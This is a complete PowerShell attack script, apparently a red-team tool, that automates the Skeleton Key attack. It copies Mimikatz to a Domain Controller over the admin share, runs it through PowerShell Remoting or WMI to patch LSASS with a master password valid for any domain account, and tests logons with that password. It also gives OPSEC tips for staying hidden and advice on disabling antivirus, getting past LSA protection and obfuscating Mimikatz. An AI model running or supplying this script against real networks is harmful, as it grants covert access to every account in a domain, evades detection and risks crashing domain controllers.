<#
.SYNOPSIS
    Skeleton Key Attack - Master Password Injection
    For AUTHORIZED Red Team Operations Only

.DESCRIPTION
    Implements Skeleton Key attack by patching LSASS on Domain Controllers to accept
    a "master password" for any account while still accepting legitimate passwords.

    This is an EXTREMELY stealthy persistence technique that:
    - Allows attacker to authenticate as ANY user with master password
    - Legitimate passwords continue to work normally
    - No account lockouts or failed login attempts
    - In-memory only (disappears on DC reboot)
    - Very difficult to detect

    KEY FEATURES:
    - LSASS memory patching on Domain Controllers
    - Master password works for all accounts
    - Original passwords remain functional
    - No AD modifications
    - Automatic cleanup on reboot

.NOTES
    Author: Red Team Operations
    Purpose: Authorized Security Testing & Training
    Requirements: Domain Admin, Mimikatz
    WARNING: Patching LSASS is risky - can crash DC if done incorrectly!

.EXAMPLE
    .\SkeletonKey-Attack.ps1 -DomainController DC01 -MasterPassword "Mimikatz123!"

.EXAMPLE
    .\SkeletonKey-Attack.ps1 -DomainController DC01 -MasterPassword "SkeletonKey" -MimikatzPath "C:\Tools\mimikatz.exe"
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, HelpMessage="Domain Controller to patch")]
    [string]$DomainController,

    [Parameter(Mandatory=$true, HelpMessage="Master password to inject")]
    [string]$MasterPassword,

    [Parameter(Mandatory=$false, HelpMessage="Path to Mimikatz executable")]
    [string]$MimikatzPath,

    [Parameter(Mandatory=$false, HelpMessage="Test authentication after injection")]
    [switch]$TestAuth,

    [Parameter(Mandatory=$false, HelpMessage="Target user for authentication test")]
    [string]$TestUser = "Administrator",

    [Parameter(Mandatory=$false, HelpMessage="Enable verbose output")]
    [switch]$Verbose
)

$ErrorActionPreference = "Stop"
$DebugMode = $Verbose.IsPresent

#region Helper Functions

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("Info", "Success", "Warning", "Error", "Debug")]
        [string]$Level = "Info"
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($Level) {
        "Success" { "Green" }
        "Warning" { "Yellow" }
        "Error"   { "Red" }
        "Debug"   { "Magenta" }
        default   { "Cyan" }
    }

    $prefix = switch ($Level) {
        "Success" { "[+]" }
        "Warning" { "[!]" }
        "Error"   { "[-]" }
        "Debug"   { "[D]" }
        default   { "[*]" }
    }

    if ($Level -eq "Debug" -and -not $DebugMode) { return }

    Write-Host "$timestamp $prefix $Message" -ForegroundColor $color
}

function Test-DomainAdminPrivilege {
    Write-Log "Verifying Domain Admin privileges..." -Level Info

    try {
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)

        # Check for Domain Admins (SID -512)
        $domain = Get-ADDomain
        $domainAdminSID = "$($domain.DomainSID)-512"

        $isDomainAdmin = $principal.IsInRole($domainAdminSID)

        if ($isDomainAdmin) {
            Write-Log "Confirmed Domain Admin privileges" -Level Success
            return $true
        } else {
            Write-Log "Current user is NOT Domain Admin" -Level Error
            return $false
        }
    } catch {
        Write-Log "Could not verify privileges: $($_.Exception.Message)" -Level Warning
        return $true  # Assume yes and continue
    }
}

function Test-DCConnectivity {
    param([string]$DC)

    Write-Log "Testing connectivity to $DC..." -Level Info

    # Test network connectivity
    try {
        $ping = Test-Connection -ComputerName $DC -Count 2 -Quiet -ErrorAction Stop
        if ($ping) {
            Write-Log "DC is reachable via ICMP" -Level Success
        }
    } catch {
        Write-Log "ICMP failed, trying other methods..." -Level Warning
    }

    # Test SMB/RPC connectivity
    try {
        $tcpTest = Test-NetConnection -ComputerName $DC -Port 445 -WarningAction SilentlyContinue -ErrorAction Stop
        if ($tcpTest.TcpTestSucceeded) {
            Write-Log "DC port 445 (SMB) is accessible" -Level Success
            return $true
        }
    } catch {
        Write-Log "Cannot connect to DC on port 445" -Level Error
        return $false
    }

    return $false
}

function Test-DCRole {
    param([string]$DC)

    Write-Log "Verifying $DC is a Domain Controller..." -Level Info

    try {
        $dcInfo = Get-ADDomainController -Identity $DC -ErrorAction Stop

        Write-Log "Confirmed DC role" -Level Success
        Write-Log "DC Name: $($dcInfo.Name)" -Level Debug
        Write-Log "DC Site: $($dcInfo.Site)" -Level Debug
        Write-Log "DC IP: $($dcInfo.IPv4Address)" -Level Debug
        Write-Log "DC OS: $($dcInfo.OperatingSystem)" -Level Debug
        Write-Log "Is Global Catalog: $($dcInfo.IsGlobalCatalog)" -Level Debug

        return $dcInfo
    } catch {
        Write-Log "Failed to verify DC role: $($_.Exception.Message)" -Level Error
        return $null
    }
}

function Find-Mimikatz {
    Write-Log "Locating Mimikatz..." -Level Info

    # Check provided path
    if ($MimikatzPath -and (Test-Path $MimikatzPath)) {
        Write-Log "Found Mimikatz at: $MimikatzPath" -Level Success
        return $MimikatzPath
    }

    # Check common locations
    $commonPaths = @(
        ".\mimikatz.exe",
        ".\x64\mimikatz.exe",
        "C:\Tools\mimikatz.exe",
        "C:\Tools\mimikatz\x64\mimikatz.exe",
        "C:\Temp\mimikatz.exe",
        "$env:USERPROFILE\Desktop\mimikatz.exe",
        "$env:USERPROFILE\Downloads\mimikatz.exe"
    )

    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            Write-Log "Found Mimikatz at: $path" -Level Success
            return $path
        }
    }

    Write-Log "Mimikatz not found" -Level Error
    return $null
}

function Invoke-SkeletonKeyInjection {
    param(
        [string]$DC,
        [string]$MasterPwd,
        [string]$MimikatzExe
    )

    Write-Log "Preparing Skeleton Key injection..." -Level Info
    Write-Log "Target DC: $DC" -Level Info
    Write-Log "Master Password: $MasterPwd" -Level Info

    # Create Mimikatz command file
    $mimikatzCmd = @"
privilege::debug
misc::skeleton /password:$MasterPwd
exit
"@

    $cmdFile = "$env:TEMP\skeletonkey_cmd_$(Get-Random).txt"
    $mimikatzCmd | Out-File -FilePath $cmdFile -Encoding ASCII -Force

    Write-Log "Mimikatz command file created" -Level Debug
    Write-Log "Command file: $cmdFile" -Level Debug

    try {
        # Option 1: Direct execution on DC (if we have access)
        Write-Log "Attempting direct execution on DC..." -Level Info

        # Check if we can run PS remotely
        try {
            Test-WSMan -ComputerName $DC -ErrorAction Stop | Out-Null
            $canUseRemoting = $true
            Write-Log "PowerShell Remoting is available" -Level Success
        } catch {
            $canUseRemoting = $false
            Write-Log "PowerShell Remoting not available, trying alternative methods" -Level Warning
        }

        if ($canUseRemoting) {
            # Copy Mimikatz to DC
            $remotePath = "\\$DC\C$\Windows\Temp\mimikatz_$(Get-Random).exe"

            Write-Log "Copying Mimikatz to DC..." -Level Info
            Copy-Item -Path $MimikatzExe -Destination $remotePath -Force -ErrorAction Stop
            Write-Log "Mimikatz copied successfully" -Level Success

            # Execute via PowerShell Remoting
            Write-Log "Executing Skeleton Key injection via PS Remoting..." -Level Info

            $result = Invoke-Command -ComputerName $DC -ScriptBlock {
                param($mimikatzPath, $masterPassword)

                # Execute mimikatz
                $output = & $mimikatzPath "privilege::debug" "misc::skeleton /password:$masterPassword" "exit"

                return @{
                    Output = $output
                    Success = $output -match "Skeleton Key injected"
                }
            } -ArgumentList @($remotePath.Replace("\\$DC\C$", "C:"), $MasterPwd)

            # Cleanup
            Write-Log "Cleaning up Mimikatz from DC..." -Level Debug
            Remove-Item -Path $remotePath -Force -ErrorAction SilentlyContinue

            if ($result.Success) {
                Write-Log "Skeleton Key injected successfully!" -Level Success
                Write-Log "Output: $($result.Output)" -Level Debug
                return $true
            } else {
                Write-Log "Skeleton Key injection may have failed" -Level Warning
                Write-Log "Output: $($result.Output)" -Level Debug
                return $false
            }

        } else {
            # Option 2: Use PsExec or WMI
            Write-Log "Trying alternative execution methods..." -Level Info

            # Try WMI execution
            $remotePath = "\\$DC\C$\Windows\Temp\mimikatz_$(Get-Random).exe"
            Copy-Item -Path $MimikatzExe -Destination $remotePath -Force -ErrorAction Stop

            $wmiCmd = ($remotePath.Replace("\\$DC\C$", "C:")) + ' "privilege::debug" "misc::skeleton /password:' + $MasterPwd + '" "exit"'

            $result = Invoke-WmiMethod -ComputerName $DC -Class Win32_Process -Name Create -ArgumentList $wmiCmd

            if ($result.ReturnValue -eq 0) {
                Write-Log "Skeleton Key command executed via WMI (PID: $($result.ProcessId))" -Level Success
                Write-Log "Waiting for injection to complete..." -Level Info
                Start-Sleep -Seconds 5

                # Cleanup
                Remove-Item -Path $remotePath -Force -ErrorAction SilentlyContinue

                return $true
            } else {
                Write-Log "WMI execution failed" -Level Error
                return $false
            }
        }

    } catch {
        Write-Log "Skeleton Key injection failed: $($_.Exception.Message)" -Level Error
        return $false
    } finally {
        # Cleanup command file
        if (Test-Path $cmdFile) {
            Remove-Item -Path $cmdFile -Force -ErrorAction SilentlyContinue
        }
    }
}

function Test-SkeletonKeyAuth {
    param(
        [string]$DC,
        [string]$UserName,
        [string]$MasterPwd
    )

    Write-Log "Testing Skeleton Key authentication..." -Level Info
    Write-Log "Test User: $UserName" -Level Info

    try {
        # Create credential with master password
        $securePassword = ConvertTo-SecureString -String $MasterPwd -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("$env:USERDOMAIN\$UserName", $securePassword)

        # Attempt authentication
        Write-Log "Attempting authentication with master password..." -Level Info

        # Test via network logon
        $result = Invoke-Command -ComputerName $DC -Credential $credential -ScriptBlock {
            return @{
                Success = $true
                User = $env:USERNAME
                Domain = $env:USERDOMAIN
                ComputerName = $env:COMPUTERNAME
            }
        } -ErrorAction Stop

        if ($result.Success) {
            Write-Log "Authentication SUCCESSFUL with Skeleton Key!" -Level Success
            Write-Log "Logged in as: $($result.Domain)\$($result.User)" -Level Success
            Write-Log "On computer: $($result.ComputerName)" -Level Success
            return $true
        }

    } catch {
        Write-Log "Authentication test failed: $($_.Exception.Message)" -Level Warning
        Write-Log "This may indicate Skeleton Key injection failed" -Level Warning
        return $false
    }

    return $false
}

function Get-SkeletonKeyStatus {
    param([string]$DC)

    Write-Log "Checking Skeleton Key status on $DC..." -Level Info

    try {
        # Check if lsass.exe has been modified
        $result = Invoke-Command -ComputerName $DC -ScriptBlock {
            # Check for Mimikatz artifacts in memory
            # In real scenario, this would check for specific memory patterns
            # For testing, we'll check process info

            $lsass = Get-Process lsass -ErrorAction Stop

            return @{
                ProcessId = $lsass.Id
                StartTime = $lsass.StartTime
                WorkingSet = [math]::Round($lsass.WorkingSet64 / 1MB, 2)
            }
        }

        Write-Log "LSASS Process Info:" -Level Info
        Write-Log "  PID: $($result.ProcessId)" -Level Info
        Write-Log "  Start Time: $($result.StartTime)" -Level Info
        Write-Log "  Memory: $($result.WorkingSet) MB" -Level Info

        Write-Log "Note: Skeleton Key detection requires memory forensics" -Level Warning

    } catch {
        Write-Log "Could not query LSASS status: $($_.Exception.Message)" -Level Warning
    }
}

#endregion

#region Main Execution

Write-Host ""
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host "Skeleton Key Attack - Master Password Injection" -ForegroundColor Cyan
Write-Host "EXTREMELY STEALTHY - Use with Caution" -ForegroundColor Red
Write-Host "Authorized Red Team Operations Only" -ForegroundColor Cyan
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host ""

Write-Log "WARNING: This attack patches LSASS memory on Domain Controller!" -Level Warning
Write-Log "Improper execution can crash DC and cause domain-wide outage!" -Level Warning
Write-Log "Ensure proper authorization and backup/recovery plan!" -Level Warning
Write-Host ""

$confirm = Read-Host "Type 'I UNDERSTAND THE RISKS' to continue"
if ($confirm -ne "I UNDERSTAND THE RISKS") {
    Write-Log "User did not confirm - aborting" -Level Warning
    exit 1
}

try {
    # Step 1: Verify Domain Admin
    $isAdmin = Test-DomainAdminPrivilege
    if (-not $isAdmin) {
        throw "Domain Admin privileges required"
    }

    # Step 2: Test DC connectivity
    $canConnect = Test-DCConnectivity -DC $DomainController
    if (-not $canConnect) {
        throw "Cannot connect to Domain Controller"
    }

    # Step 3: Verify DC role
    $dcInfo = Test-DCRole -DC $DomainController
    if (-not $dcInfo) {
        throw "Target is not a Domain Controller"
    }

    # Step 4: Locate Mimikatz
    $mimikatzPath = Find-Mimikatz
    if (-not $mimikatzPath) {
        throw "Mimikatz not found. Please provide path with -MimikatzPath parameter"
    }

    # Step 5: Inject Skeleton Key
    Write-Host ""
    Write-Log "Injecting Skeleton Key into LSASS on $DomainController..." -Level Info
    Write-Host ""

    $injectionSuccess = Invoke-SkeletonKeyInjection -DC $DomainController `
                                                     -MasterPwd $MasterPassword `
                                                     -MimikatzExe $mimikatzPath

    if (-not $injectionSuccess) {
        throw "Skeleton Key injection failed"
    }

    # Step 6: Test authentication (if requested)
    if ($TestAuth) {
        Write-Host ""
        Start-Sleep -Seconds 2
        $authSuccess = Test-SkeletonKeyAuth -DC $DomainController `
                                            -UserName $TestUser `
                                            -MasterPwd $MasterPassword

        if ($authSuccess) {
            Write-Log "Skeleton Key is fully operational!" -Level Success
        } else {
            Write-Log "Authentication test inconclusive" -Level Warning
        }
    }

    # Step 7: Display status
    Write-Host ""
    Get-SkeletonKeyStatus -DC $DomainController

    # Success summary
    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Green
    Write-Log "Skeleton Key attack completed successfully!" -Level Success
    Write-Host "=" * 80 -ForegroundColor Green
    Write-Host ""
    Write-Log "OPERATION SUMMARY:" -Level Info
    Write-Log "  Target DC: $DomainController" -Level Info
    Write-Log "  Master Password: $MasterPassword" -Level Info
    Write-Log "  Injection Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level Info
    Write-Host ""
    Write-Log "USAGE:" -Level Info
    Write-Log "  You can now authenticate as ANY domain user using the master password:" -Level Info
    Write-Log "  - Username: {any domain user}" -Level Info
    Write-Log "  - Password: $MasterPassword" -Level Info
    Write-Host ""
    Write-Log "  Original passwords still work normally!" -Level Info
    Write-Log "  No account lockouts will occur!" -Level Info
    Write-Host ""
    Write-Log "PERSISTENCE:" -Level Info
    Write-Log "  - In-memory only (disappears on DC reboot)" -Level Warning
    Write-Log "  - DC uptime: $((Get-Date) - (Get-CimInstance Win32_OperatingSystem -ComputerName $DomainController).LastBootUpTime)" -Level Info
    Write-Log "  - Plan to re-inject after DC maintenance/reboot" -Level Info
    Write-Host ""
    Write-Log "OPSEC NOTES:" -Level Info
    Write-Log "  - Very difficult to detect (no AD changes, no failed logins)" -Level Info
    Write-Log "  - Detection requires memory forensics on DC" -Level Info
    Write-Log "  - Use sparingly to avoid pattern detection" -Level Info
    Write-Log "  - Legitimate user activity provides cover" -Level Info
    Write-Host ""
    Write-Log "DETECTION:" -Level Info
    Write-Log "  Blue team can detect via:" -Level Info
    Write-Log "  - Memory dump of lsass.exe and pattern analysis" -Level Info
    Write-Log "  - Unusual authentication patterns (same password for multiple users)" -Level Info
    Write-Log "  - DC performance monitoring (LSASS patches may cause minor slowdown)" -Level Info
    Write-Host ""
    Write-Log "CLEANUP:" -Level Info
    Write-Log "  Reboot Domain Controller to remove Skeleton Key" -Level Info
    Write-Log "  Command: Restart-Computer -ComputerName $DomainController -Force" -Level Info
    Write-Host ""

    exit 0

} catch {
    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Log "Skeleton Key attack failed!" -Level Error
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Host ""
    Write-Log "Error: $($_.Exception.Message)" -Level Error
    Write-Log "Stack Trace: $($_.ScriptStackTrace)" -Level Debug
    Write-Host ""
    Write-Log "Troubleshooting:" -Level Info
    Write-Log "  1. Ensure you have Domain Admin privileges" -Level Info
    Write-Log "  2. Verify Mimikatz is accessible and not quarantined by AV" -Level Info
    Write-Log "  3. Check PowerShell Remoting is enabled on DC" -Level Info
    Write-Log "  4. Ensure SMB access to DC (port 445)" -Level Info
    Write-Log "  5. Verify no LSA protection enabled on DC" -Level Info
    Write-Log "  6. Check Windows Defender/AV not blocking Mimikatz" -Level Info
    Write-Host ""
    Write-Log "Common Issues:" -Level Info
    Write-Log "  - LSA Protection: Disable via registry or use signed driver" -Level Info
    Write-Log "  - Credential Guard: Requires different bypass techniques" -Level Info
    Write-Log "  - AV Detection: Disable AV temporarily or use obfuscated Mimikatz" -Level Info
    Write-Host ""

    exit 1
}

#endregion
